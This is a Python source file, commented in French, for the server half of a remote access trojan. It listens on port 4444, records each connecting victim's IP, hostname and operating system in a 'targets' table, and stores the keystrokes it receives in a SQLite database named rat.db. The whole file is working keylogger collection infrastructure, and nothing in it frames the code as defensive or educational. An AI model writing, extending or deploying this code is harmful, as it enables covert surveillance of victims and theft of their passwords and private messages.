import socket
import sqlite3
from datetime import datetime
import json
# Connexion à la base de données
conn = sqlite3.connect("../bdd/rat.db")
cursor = conn.cursor()

# Fonction pour sauvegarder les frappes de clavier
def save_keystroke(target_ip, key_pressed):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)", 
                   (timestamp, target_ip, key_pressed))
    conn.commit()
# Fonction pour sauvegarder une cible dans la table targets
def save_target(ip_address, hostname="unknown", os="unknown"):
    try:
        # Insérer une nouvelle cible ou ignorer si elle existe déjà (grâce à UNIQUE sur ip_address)
        cursor.execute("""
            INSERT OR IGNORE INTO targets (ip_address, hostname, os)
            VALUES (?, ?, ?)
        """, (ip_address, hostname, os))
        conn.commit()
        print(f"Target sauvegardée : IP={ip_address}, Hostname={hostname}, OS={os}")
    except Exception as e:
        print(f"Erreur lors de la sauvegarde de la cible : {e}")


# Fonction pour traiter les données reçues
def process_data(data, client_ip):
    try:
        # Convertir les données JSON
        parsed_data = json.loads(data)
        data_type = parsed_data.get("type")

        # Enregistrer la cible
        hostname = parsed_data.get("hostname", "unknown")
        os_info = parsed_data.get("os", "unknown")
        save_target(client_ip, hostname, os_info)

        if data_type == "keystroke":
            save_keystroke(client_ip, parsed_data.get("data"))
            print(f"Keystroke sauvegardée : {parsed_data.get('data')}")
        else:
            print("Type de données non supporté.")
    except Exception as e:
        print(f"Erreur lors du traitement des données : {e}")


# Configuration du serveur
SERVER_HOST = "0.0.0.0"  # Accepter les connexions de toutes les interfaces
SERVER_PORT = 4444

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)

print(f"Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}...")

while True:
    client_socket, client_address = server_socket.accept()
    print(f"Connexion reçue de {client_address}")
    data = client_socket.recv(1024).decode('utf-8')
    if data:
        process_data(data, client_address[0])
    client_socket.close()
